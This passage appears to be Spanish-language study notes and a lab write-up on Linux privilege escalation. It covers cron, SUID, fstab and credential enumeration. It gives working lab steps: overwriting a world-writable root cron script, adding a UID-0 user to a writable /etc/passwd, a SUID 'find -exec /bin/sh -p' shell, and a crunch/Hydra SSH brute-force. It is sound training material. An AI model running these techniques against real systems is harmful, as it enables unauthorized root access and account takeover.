drwxr-xr-x   2 root root 4.0K Aug 16 04:17 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder

/etc/cron.monthly:
total 24K
drwxr-xr-x   2 root root 4.0K Aug 16 04:25 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  313 May 19  2019 0anacron

/etc/cron.weekly:
total 28K
drwxr-xr-x   2 root root 4.0K Aug 16 04:26 .
drwxr-xr-x 120 root root  12K Aug 18 12:37 ..
-rw-r--r--   1 root root  102 Oct 11  2019 .placeholder
-rwxr-xr-x   1 root root  312 May 19  2019 0anacron
-rwxr-xr-x   1 root root  813 Feb 10  2019 man-db
joe@debian-privesc:~$
```

Al enumerar los contenidos del directorio, notamos varias tareas programadas para ejecutarse diariamente.

Vale la pena señalar que los administradores del sistema a menudo agregan sus propias tareas programadas en el archivo **/etc/crontab** . Estas tareas se deben inspeccionar cuidadosamente en busca de permisos de archivos inseguros, ya que la mayoría de los trabajos en este archivo en particular se ejecutarán como root. Para ver los trabajos programados del usuario actual, podemos ejecutar **crontab** seguido del parámetro **-l** .

```
joe@debian-privesc:~$ crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').
#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command

```

En el resultado anterior, solo están presentes las instrucciones comentadas, lo que significa que no se ha configurado ningún trabajo cron para el usuario _joe_ . Sin embargo, si intentamos ejecutar el mismo comando con el prefijo **sudo** , descubrimos que un script de copia de seguridad está programado para ejecutarse cada minuto.

```
joe@debian-privesc:~$ sudo crontab -l
[sudo] password for joe:
# Edit this file to introduce tasks to be run by cron.
...
# m h  dom mon dow   command

* * * * * /bin/bash /home/joe/.scripts/user_backups.sh
```

Listar trabajos cron usando sudo revela trabajos ejecutados por el usuario root . En este ejemplo, muestra un script de respaldo ejecutándose como root. Si este archivo tiene permisos débiles, es posible que podamos aprovecharlo para escalar nuestros privilegios.

Como veremos más adelante en este Módulo, al usuario _joe_ se le ha otorgado un permiso sudo específico solo para enumerar los trabajos cron que se ejecutan como usuario raíz. No se puede abusar de este permiso por sí solo para obtener un shell raíz.

En algún momento, es posible que necesitemos aprovechar un exploit para escalar nuestros privilegios locales. Si es así, nuestra búsqueda de un exploit que funcione comienza con la enumeración de todas las aplicaciones instaladas, anotando la versión de cada una. Podemos usar esta información para buscar un exploit coincidente.

La búsqueda manual de esta información puede llevar mucho tiempo y ser ineficaz, por lo que aprenderemos a automatizar este proceso en la siguiente sección. Sin embargo, debemos saber cómo consultar manualmente los paquetes instalados, ya que esto es necesario para corroborar la información obtenida durante los pasos de enumeración anteriores.

<br />

**Installed Applications**

Los sistemas basados ​​en Linux utilizan una variedad de administradores de paquetes. Por ejemplo, las distribuciones de Linux basadas en Debian, como la de nuestro laboratorio, usan _dpkg_, mientras que los sistemas basados ​​en Red Hat usan _rpm_ .

Para enumerar las aplicaciones instaladas por dpkg en nuestro sistema Debian, podemos usar **dpkg -l** .

```
joe@debian-privesc:~$ dpkg -l
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                  Version                                      Architecture Description
+++-=====================================-============================================-============-===============================================================================
ii  accountsservice                       0.6.45-2                                     amd64        query and manipulate user account information
ii  acl                                   2.2.53-4                                     amd64        access control list - utilities
ii  adduser                               3.118                                        all          add and remove users and groups
ii  adwaita-icon-theme                    3.30.1-1                                     all          default icon theme of GNOME
ii  aisleriot                             1:3.22.7-2                                   amd64        GNOME solitaire card game collection
ii  alsa-utils                            1.1.8-2                                      amd64        Utilities for configuring and using ALSA
ii  anacron                               2.3-28                                       amd64        cron-like program that doesn't go by time
ii  analog                                2:6.0-22                                     amd64        web server log analyzer
ii  apache2                               2.4.38-3+deb10u7                             amd64        Apache HTTP Server
ii  apache2-bin                           2.4.38-3+deb10u7                             amd64        Apache HTTP Server (modules and other binary files)
ii  apache2-data                          2.4.38-3+deb10u7                             all          Apache HTTP Server (common files)
ii  apache2-doc                           2.4.38-3+deb10u7                             all          Apache HTTP Server (on-site documentation)
ii  apache2-utils                         2.4.38-3+deb10u7                             amd64        Apache HTTP Server (utility programs for web servers)
...
```

Esto confirma lo que esperábamos antes al enumerar los puertos de escucha: la máquina Debian 10 está, de hecho, ejecutando un servidor web. En este caso, está ejecutando Apache2.

Como mencionamos anteriormente, los archivos con restricciones de acceso insuficientes pueden crear una vulnerabilidad que puede otorgar privilegios elevados a un atacante. Esto sucede con mayor frecuencia cuando un atacante puede modificar secuencias de comandos o archivos binarios que se ejecutan en el contexto de una cuenta privilegiada.

Los archivos confidenciales que puede leer un usuario sin privilegios también pueden contener información importante, como credenciales codificadas para una base de datos o una cuenta de servicio que se ejecuta con mayores privilegios.

Dado que no es factible verificar manualmente los permisos de cada archivo y directorio, debemos automatizar esta tarea tanto como sea posible. Para empezar, podemos usar **find** para identificar archivos con permisos inseguros.

En el siguiente ejemplo, buscamos todos los directorios en los que el usuario actual puede escribir en el sistema de destino. Buscaremos en todo el directorio raíz ( **/** ) y usaremos el argumento **-writable** para especificar el atributo que nos interesa. También podemos usar **-type d** para ubicar directorios y filtrar errores con **2>/dev/null** :

```
joe@debian-privesc:~$ find / -writable -type d 2>/dev/null
..
/home/joe
/home/joe/Videos
/home/joe/Templates
/home/joe/.local
/home/joe/.local/share
/home/joe/.local/share/sounds
/home/joe/.local/share/evolution
/home/joe/.local/share/evolution/tasks
/home/joe/.local/share/evolution/tasks/system
/home/joe/.local/share/evolution/tasks/trash
/home/joe/.local/share/evolution/addressbook
/home/joe/.local/share/evolution/addressbook/system
/home/joe/.local/share/evolution/addressbook/system/photos
/home/joe/.local/share/evolution/addressbook/trash
/home/joe/.local/share/evolution/mail
/home/joe/.local/share/evolution/mail/trash
/home/joe/.local/share/evolution/memos
/home/joe/.local/share/evolution/memos/system
/home/joe/.local/share/evolution/memos/trash
/home/joe/.local/share/evolution/calendar
/home/joe/.local/share/evolution/calendar/system
/home/joe/.local/share/evolution/calendar/trash
/home/joe/.local/share/icc
/home/joe/.local/share/gnome-shell
/home/joe/.local/share/gnome-settings-daemon
/home/joe/.local/share/keyrings
/home/joe/.local/share/tracker
/home/joe/.local/share/tracker/data
/home/joe/.local/share/folks
/home/joe/.local/share/gvfs-metadata
/home/joe/.local/share/applications
/home/joe/.local/share/nano
/home/joe/Downloads
/home/joe/.scripts
/home/joe/Pictures
/home/joe/.cache

...
```

Como se muestra arriba, varios directorios parecen tener permisos de escritura en todo el mundo, incluido el directorio **/home/joe/.scripts** , que es la ubicación del script cron que encontramos anteriormente. Esto sin duda merece una mayor investigación.

<br />

**Mounted Devices**

Avancemos más con nuestra enumeración. En la mayoría de los sistemas, las unidades se montan automáticamente en el momento del arranque. Debido a esto, es fácil olvidarse de las unidades desmontadas que podrían contener información valiosa. Siempre debemos buscar unidades desmontadas y, si existen, comprobar los permisos de montaje.

En los sistemas basados ​​en Linux, podemos usar **mount** para enumerar todos los sistemas de archivos montados. Además, el archivo **/etc/fstab** enumera todas las unidades que se montarán en el momento del arranque.

```
joe@debian-privesc:~$ cat /etc/fstab 
...
UUID=60b4af9b-bc53-4213-909b-a2c5e090e261 /               ext4    errors=remount-ro 0       1
# swap was on /dev/sda5 during installation
UUID=86dc11f3-4b41-4e06-b923-86e78eaddab7 none            swap    sw              0       0
/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0

joe@debian-privesc:~$ moun
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001064k,nr_inodes=250266,mode=755)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000)
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=204196k,mode=755)
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
tmpfs on /run/lock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=5120k)
tmpfs on /sys/fs/cgroup type tmpfs (ro,nosuid,nodev,noexec,mode=755)
cgroup2 on /sys/fs/cgroup/unified type cgroup2 (rw,nosuid,nodev,noexec,relatime,nsdelegate)
cgroup on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
pstore on /sys/fs/pstore type pstore (rw,nosuid,nodev,noexec,relatime)
bpf on /sys/fs/bpf type bpf (rw,nosuid,nodev,noexec,relatime,mode=700)
...
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=25,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=10550)
mqueue on /dev/mqueue type mqueue (rw,relatime)
debugfs on /sys/kernel/debug type debugfs (rw,relatime)
hugetlbfs on /dev/hugepages type hugetlbfs (rw,relatime,pagesize=2M)
tmpfs on /run/user/117 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=117,gid=124)
tmpfs on /run/user/1000 type tmpfs (rw,nosuid,nodev,relatime,size=204192k,mode=700,uid=1000,gid=1000)
binfmt_misc on /proc/sys/fs/binfmt_misc type binfmt_misc (rw,relatime)
```

El resultado revela una partición de intercambio y el disco ext4 principal de este sistema Linux.

Tenga en cuenta que el administrador del sistema podría haber usado configuraciones personalizadas o secuencias de comandos para montar unidades que no figuran en el archivo **/etc/fstab** . Debido a esto, es una buena práctica no solo escanear **/etc/fstab** , sino también recopilar información sobre las unidades montadas usando **mount** .

Además, podemos usar **lsblk** para ver todos los discos disponibles.

```
joe@debian-privesc:~$ lsblk
NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda      8:0    0   32G  0 disk
|-sda1   8:1    0   31G  0 part /
|-sda2   8:2    0    1K  0 par
`-sda5   8:5    0  975M  0 part [SWAP]
sr0     11:0    1 1024M  0 rom

```

Notaremos que la unidad _sda_ consta de tres particiones numeradas diferentes. En algunas situaciones, mostrar información de todos los discos locales del sistema puede revelar particiones que no están montadas. Dependiendo de la configuración del sistema (o configuración incorrecta), entonces podríamos montar esas particiones y buscar documentos interesantes, credenciales u otra información que nos permita escalar nuestros privilegios u obtener una mejor posición en la red.

Otra técnica común de escalada de privilegios implica la explotación de controladores de dispositivos y módulos del núcleo. Exploraremos las tácticas de explotación reales más adelante en este módulo, pero primero examinemos algunas técnicas de enumeración importantes.

Dado que esta técnica se basa en hacer coincidir las vulnerabilidades con los exploits correspondientes, necesitaremos recopilar una lista de controladores y módulos del kernel que están cargados en el objetivo. Podemos enumerar los módulos del kernel cargados usando **lsmod** sin argumentos adicionales.

```
joe@debian-privesc:~$ lsmod
Module                  Size  Used by
binfmt_misc            20480  1
rfkill                 28672  1
sb_edac                24576  0
crct10dif_pclmul       16384  0
crc32_pclmul           16384  0
ghash_clmulni_intel    16384  0
vmw_balloon            20480  0
...
drm                   495616  5 vmwgfx,drm_kms_helper,ttm
libata                270336  2 ata_piix,ata_generic
vmw_pvscsi             28672  2
scsi_mod              249856  5 vmw_pvscsi,sd_mod,libata,sg,sr_mod
i2c_piix4              24576  0
button                 20480  0
```

Una vez que hayamos recopilado la lista de módulos cargados e identificado aquellos sobre los que queremos más información, como **libata** en el ejemplo anterior, podemos usar **modinfo** para obtener más información sobre el módulo específico. Debemos tener en cuenta que esta herramienta requiere la ruta completa para ejecutarse.

```
joe@debian-privesc:~$ /sbin/modinfo libata
filename:       /lib/modules/4.19.0-21-amd64/kernel/drivers/ata/libata.ko
version:        3.00
license:        GPL
description:    Library module for ATA devices
author:         Jeff Garzik
srcversion:     00E4F01BB3AA2AAF98137BF
depends:        scsi_mod
retpoline:      Y
intree:         Y
name:           libata
vermagic:       4.19.0-21-amd64 SMP mod_unload modversions
sig_id:         PKCS#7
signer:         Debian Secure Boot CA
sig_key:        4B:6E:F5:AB:CA:66:98:25:17:8E:05:2C:84:66:7C:CB:C0:53:1F:8C
...
```

Una vez que hemos obtenido una lista de controladores y sus versiones, estamos mejor posicionados para encontrar vulnerabilidades relevantes.

Más adelante en este Módulo, exploraremos varios métodos de escalada de privilegios. Sin embargo, hay algunas enumeraciones específicas que debemos cubrir en esta sección que podrían revelar "atajos" interesantes para la escalada de privilegios.

<br />

**SUID Files**

Aparte de los permisos de archivo _rwx_ descritos anteriormente, dos derechos especiales adicionales pertenecen a los archivos ejecutables: _setuid_ y _setgid_ . Estos se simbolizan con la letra "s".

Si se establecen estos dos derechos, aparecerá una "s" en mayúsculas o minúsculas en los permisos. Esto permite que el usuario actual ejecute el archivo con los derechos del _propietario_ (setuid) o del _grupo de propietarios_ (setgid).

Cuando se ejecuta un binario, normalmente hereda los permisos del usuario que lo ejecuta. Sin embargo, si se establecen los permisos SUID, el binario se ejecutará con los permisos del propietario del archivo. Esto significa que si un binario tiene el bit SUID establecido y el archivo es propiedad de root, cualquier usuario local podrá ejecutar ese binario con privilegios elevados.

Cuando un usuario o un script automatizado por el sistema inicia una aplicación SUID, hereda el UID/GID de su script de inicio: esto se conoce como UID/GID efectivo (eUID, eGID), que es el usuario real que el sistema operativo verifica para otorgar permisos para una acción determinada.

Cualquier usuario que logre subvertir un programa raíz setuid para llamar a un comando de su elección puede hacerse pasar por el usuario raíz y obtener todos los derechos en el sistema. Los evaluadores de penetración buscan regularmente este tipo de archivos cuando obtienen acceso a un sistema como una forma de escalar sus privilegios.

Podemos usar **find** para buscar binarios marcados con SUID. En este caso, estamos comenzando nuestra búsqueda en el directorio raíz ( **/** ), buscando archivos ( **-type f** ) con el bit SUID establecido, ( **-perm -u=s** ) y descartando todos los mensajes de error ( **2>/dev/ nulo** ):

```
joe@debian-privesc:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/fusermoun
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/ntfs-3g
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/bwrap
/usr/bin/su
/usr/bin/umoun
/usr/bin/moun
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/pppd
```

En este caso, el comando encontró varios binarios SUID. La explotación de los binarios SUID variará en función de varios factores. Por ejemplo, si **/bin/cp** (el comando _de copia_ ) fuera SUID, podríamos copiar y sobrescribir archivos confidenciales como **/etc/passwd** .

Se puede encontrar una lista completa de técnicas de escalada de privilegios de Linux en un compendio [24](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/linux-privilege-escalation/enumerating-linux/manual-enumeration#fn24) de g0tmi1k, así como en otros recursos [25](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/linux-privilege-escalation/enumerating-linux/manual-enumeration#fn25) más actualizados [26 .](https://portal.offsec.com/courses/pen-200-2023/books-and-videos/modal/modules/linux-privilege-escalation/enumerating-linux/manual-enumeration#fn26)

Habiendo cubierto los conceptos principales detrás de la enumeración manual de sistemas Linux para técnicas de escalada de privilegios, vamos a aprender cómo automatizar el proceso de forma masiva en la próxima sección.

<br />



**2. On the target VM #1, use an appropriate privilege escalation technique to gain access to root and read the flag. Scheduling is all that matters.**

Acudimos al fichero /etc/crontab y echamos un vistazo al contenido:

```
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

cd /etc/cron.hourly

ls
archiver

cat archiver 
#!/bin/sh

# I wanted this to run more often so moved to it to my personal crontab so I could run it every minute
/var/archives/archive.sh

cd /var/archives

ls -la
total 16
drwxr-xr-x 1 root root 4096 Dec  7  2021 .
drwxr-xr-x 1 root root 4096 Dec  7  2021 ..
-rwxrwxrwx 1 root root  159 Nov 15  2021 archive.sh
```

Finalmente, examinando las tareas programadas llegamos a un script sobre el que podemos escribir que ese ejecuta por root cada minuto.

Así, cambiamos los contenidos del script para que (por el bien de la simplicidad) nos coloque la flag en nuestro escritorio:

```
echo "cat /root/flag.txt > /home/student/flag.txt" > archive.sh

echo "chmod +r /home/student/flag.txt" >> archive.sh

cat archive.sh 
cat /root/flag.txt > /home/student/flag.txt
chmod +r /home/student/flag.txt

cd

ls
flag.txt

cat flag.txt 
OS{74ac56772cc7aab9d257834f01ee0441}
```

<br />

**3. On the target VM #2, use another appropriate privilege escalation technique to gain access to root and read the flag. Take a closer look at file permissions.**

Podemos observar que tenemos permisos de escritura sobre el fichero /etc/passwd. 

```
ls -la /etc/passwd
-rw-rw-rw- 1 root root 1370 Mar 11 11:00 /etc/passwd
```

Esto nos permite añadir un usuario con privilegios elevados para luego cambiar a ese usuario escalando privilegios en el proceso.

En primer lugar generamos una contraseña para nuestro usuario. Esta debe tener el formato adecuado:

```
openssl passwd -6 -salt xyz  password
$6$xyz$ShNnbwk5fmsyVIlzOf8zEg4YdEH2aWRSuY4rJHbzLZRlWcoXbxxoI0hfn0mdXiJCdBJ/lTpKjk.vu5NZOv0UM0
```

Seguidamente, atendiendo al formato de las líneas del fichero /etc/passwd, añadimos la línea de un usuario. Con frecuencia es necesario hacer esta operación mediante un editor de texto debido a que los caracteres especiales pueden corromper la integridad:

```
cat /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
tcpdump:x:105:106::/nonexistent:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
student:x:1000:1000::/home/student:/bin/bash
user:$6$xyz$ShNnbwk5fmsyVIlzOf8zEg4YdEH2aWRSuY4rJHbzLZRlWcoXbxxoI0hfn0mdXiJCdBJ/lTpKjk.vu5NZOv0UM0:0:0::/home/user:/bin/bash

```

Observemos que hemos cambiado tanto el UID como el GID a 0 ya que este es el identificador unívoco del usuario root en Linux y de esta forma nuestro nuevo usuario será identificado como el usuario root.

Ahora, con el comando *su* cambiamos a nuestro nuevo usuario y extraemos la flag:

```
su user
Password: 
root@a7db76cf0940:/home/student# cat /root/flag.txt
OS{4e95d1383f25004f693ca069bd3ad641}
root@a7db76cf0940:/home/student# 
```

<br />

**4. Again, use an appropriate privilege escalation technique to gain access to root and read the flag on the target VM #3. Binary flags and custom shell are what to look for.**

Buscamos ficheros con permisos SUID, es decir, ficheros que se ejecutan en el contexto de seguridad del usuario que tiene la propiedad del fichero. Entre ellos encontramos el binario *find*:

```
student@4b5ec08eb3c7:~$ find / -perm -u=s 2>/dev/null
/bin/umoun
/bin/su
/bin/moun
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/find
```

Así, utilizamos GTFOBins para ver si el programa *find* puede ser utilizado para desplegar una shell. Efectivamente así es y obtenemos la flag:

```
student@4b5ec08eb3c7:~$ find . -exec /bin/sh -p \; -quit
# whoami
roo
# cat /root/flag.txt
Great job! You found me.
Here is your flag:

OS{b3dd5cfc1b7b7f3d1ab9ee099794b8dc}
```

<br />

#### 3.2. Exposed Confidential Information.

##### 3.2.1. Inspecting User Trails.

Como pentesters, a menudo tenemos limitaciones de tiempo durante nuestros compromisos. Por esta razón, debemos centrar nuestros esfuerzos primero en la fruta madura.

Uno de esos objetivos son los archivos de historial de los usuarios. Estos archivos a menudo contienen actividad de usuario de texto claro que puede incluir información confidencial, como contraseñas u otro material de autenticación.

En los sistemas Linux, las aplicaciones suelen almacenar archivos de configuración y subdirectorios específicos del usuario dentro del directorio de inicio de un usuario. Estos archivos a menudo se denominan _dotfiles_ porque van precedidos de un punto. El carácter de punto antepuesto le indica al sistema que no muestre estos archivos cuando los inspeccione mediante comandos básicos de listado.

Un ejemplo de un archivo de puntos es **.bashrc**. El script bash **.bashrc** se ejecuta cuando se abre una nueva ventana de terminal desde una sesión de inicio de sesión existente o cuando se inicia una nueva instancia de shell desde una sesión de inicio de sesión existente. Desde dentro de este script, se pueden especificar variables de entorno adicionales para que se establezcan automáticamente cada vez que se genere el shell de un nuevo usuario.

A veces, los administradores del sistema almacenan las credenciales dentro de las variables de entorno como una forma de interactuar con scripts personalizados que requieren autenticación.

Al revisar nuestra máquina Debian de destino, notaremos una entrada de variable de entorno inusual:

```
joe@debian-privesc:~$ env
...
XDG_SESSION_CLASS=user
TERM=xterm-256color
SCRIPT_CREDENTIALS=lab
USER=joe
LC_TERMINAL_VERSION=3.4.16
SHLVL=1
XDG_SESSION_ID=35
LC_CTYPE=UTF-8
XDG_RUNTIME_DIR=/run/user/1000
SSH_CLIENT=192.168.118.2 59808 22
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
MAIL=/var/mail/joe
SSH_TTY=/dev/pts/1
OLDPWD=/home/joe/.cache
_=/usr/bin/env
```

Curiosamente, la variable _SCRIPT_CREDENTIALS_ contiene un valor que se asemeja a una contraseña. Para confirmar que estamos tratando con una variable permanente, debemos inspeccionar el archivo de configuración **.bashrc .**

```
joe@debian-privesc:~$ cat .bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
export SCRIPT_CREDENTIALS="lab"
HISTCONTROL=ignoreboth
...
```

De la lista anterior, podemos confirmar que la variable que contiene la contraseña se exporta cuando se inicia el shell de un usuario.

Almacenar una contraseña de texto simple dentro de una variable de entorno no se considera una práctica segura. Para autenticarse de manera segura con un script interactivo, se recomienda adoptar la autenticación de clave pública y proteger las claves privadas con frases de contraseña.

Primero intentemos escalar nuestros privilegios escribiendo directamente la contraseña recién descubierta.

```
joe@debian-privesc:~$ su - roo
Password:

root@debian-privesc:~# whoami
roo
```

Dado que hemos obtenido con éxito los privilegios de root, ahora intentemos otra ruta de escalada de privilegios que, en cambio, se basa en el hallazgo de credenciales de la variable de entorno.

En lugar de apuntar directamente a la cuenta raíz, podríamos intentar obtener acceso al usuario _eve_ que descubrimos en una sección anterior.

Con nuestro conocimiento de las credenciales del script, podríamos intentar crear un diccionario personalizado derivado de la contraseña conocida para intentar forzar la cuenta de _eve por fuerza bruta._

Podemos hacer esto usando la herramienta de línea de comando **crunch** para generar una lista de palabras personalizada. Estableceremos la longitud mínima y máxima en 6 caracteres, especificaremos el patrón usando el parámetro **-t** , luego codificaremos los primeros tres caracteres en **Lab** seguidos de tres dígitos numéricos.

```
kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
```

Entonces podemos verificar el contenido de la lista de palabras generada:

```
kali@kali:~$ cat wordlist
Lab000
Lab001
Lab002
Lab003
Lab004
Lab005
Lab006
Lab007
Lab008
Lab009
...
```

Dado que hay un servidor SSH disponible en nuestra máquina de destino, podemos intentar intentar un ataque remoto de fuerza bruta a través de Hydra. Proporcionaremos el nombre de usuario de destino con el parámetro **-l** , nuestra lista de palabras con **-P** , la dirección IP de destino y, finalmente, **ssh** como protocolo de destino. También incluiremos **-V** para aumentar la verbosidad.

```
kali@kali:~$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-08-23 14:30:44
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1000 login tries (l:1/p:1000), ~250 tries per task
[DATA] attacking ssh://192.168.50.214:22/
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab000" - 1 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab001" - 2 of 1000 [child 1] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab002" - 3 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab003" - 4 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab004" - 5 of 1000 [child 2] (0/0)
...
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab120" - 121 of 1000 [child 0] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab121" - 122 of 1000 [child 3] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab122" - 123 of 1000 [child 2] (0/0)
[ATTEMPT] target 192.168.50.214 - login "eve" - pass "Lab123" - 124 of 1000 [child 1] (0/0)
[22][ssh] host: 192.168.50.214   login: eve   password: Lab123
1 of 1 target successfully completed, 1 valid password found

```

Nuestro ataque de fuerza bruta de hidra tuvo éxito y ahora podemos iniciar sesión directamente en la máquina de destino con las credenciales de eve a través de SSH:

```
kali@kali:~$ ssh eve@192.168.50.214
eve@192.168.50.214's password:
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30) x86_64
...
eve@debian-privesc:~$
```

Una vez que haya iniciado sesión como _eve_ , podemos verificar si estamos ejecutando como un usuario privilegiado al enumerar las capacidades de sudo usando el comando **sudo -l** .

```
eve@debian-privesc:~$ sudo -l
[sudo] password for eve:
Matching Defaults entries for eve on debian-privesc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL
```

Dado que _Eve_ parece ser una cuenta administrativa, descubrimos que puede ejecutar cualquier comando como un usuario elevado. Esto significa que podemos elevarnos directamente a root ejecutando _i_ con sudo y proporcionando las credenciales de eve.

```
eve@debian-privesc:~$ sudo -i
[sudo] password for eve:

root@debian-privesc:/home/eve# whoami
roo

```

<br />

##### 3.2.2. Inspecting Service Footprints.

**Daemons**

Los *Daemons* son servicios de Linux que se generan en el momento del arranque para realizar operaciones específicas sin necesidad de interacción del usuario. Los servidores Linux a menudo están configurados para albergar numerosos demonios, como SSH, servidores web y bases de datos, por mencionar algunos.

Los administradores de sistemas a menudo confían en Daemons personalizados para ejecutar tareas ad-hoc y, a veces, descuidan las mejores prácticas de seguridad.

Como parte de nuestros esfuerzos de enumeración, debemos inspeccionar el comportamiento de los procesos en ejecución para buscar cualquier anomalía que pueda conducir a una elevación de privilegios.

<br />

**PS, Watch** 

A diferencia de los sistemas Windows, en Linux podemos enumerar información sobre procesos de mayor privilegio, como los que se ejecutan dentro del contexto del usuario _raíz ._

